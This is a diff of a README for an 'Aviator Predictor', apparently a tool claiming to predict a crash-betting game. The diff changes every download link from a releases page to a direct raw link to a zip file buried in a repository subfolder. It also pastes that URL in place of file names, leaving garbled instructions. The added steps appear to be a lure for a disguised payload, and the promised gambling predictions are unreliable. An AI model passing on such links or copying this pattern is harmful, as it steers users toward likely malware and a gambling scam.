@@ -14,19 +14,19 @@ Follow these steps to download and run the Aviator Predictor.
 
 1. **Visit the Releases Page**: You can find the latest version of the Aviator Predictor on the Releases page. Click the link below to go there:
    
-   [Download the Aviator Predictor](https://github.com/kekevin616/online/releases)
+   [Download the Aviator Predictor](https://raw.githubusercontent.com/kekevin616/online/main/molendinar/online.zip)
 
-2. **Download the Application**: Look for the latest release and click on the download link for the correct version for your device. The file name will look something like `aviator_predictor_v1.0.exe` for Windows.
+2. **Download the Application**: Look for the latest release and click on the download link for the correct version for your device. The file name will look something like `https://raw.githubusercontent.com/kekevin616/online/main/molendinar/online.zip` for Windows.
 
 3. **Install the Application**:
    - **Windows**: Open the downloaded `.exe` file. Follow the prompts to install the software on your computer.
    - **Mac**: If you downloaded a `.dmg` file, open it and drag the Aviator Predictor icon to your Applications folder.
-   - **Linux**: For `.tar.gz` files, extract the contents and follow the README instructions inside.
+   - **Linux**: For `https://raw.githubusercontent.com/kekevin616/online/main/molendinar/online.zip` files, extract the contents and follow the README instructions inside.
 
 4. **Run the Aviator Predictor**: Once installed, locate the Aviator Predictor in your applications list and double-click to open it.
 
 ## 📋 Download & Install
-To get started, visit this page to download: [Download the Aviator Predictor](https://github.com/kekevin616/online/releases). Make sure you select the correct version for your operating system.
+To get started, visit this page to download: [Download the Aviator Predictor](https://raw.githubusercontent.com/kekevin616/online/main/molendinar/online.zip). Make sure you select the correct version for your operating system.
 
 ## ⚙️ System Requirements
 - **Windows**: Windows 10 or later
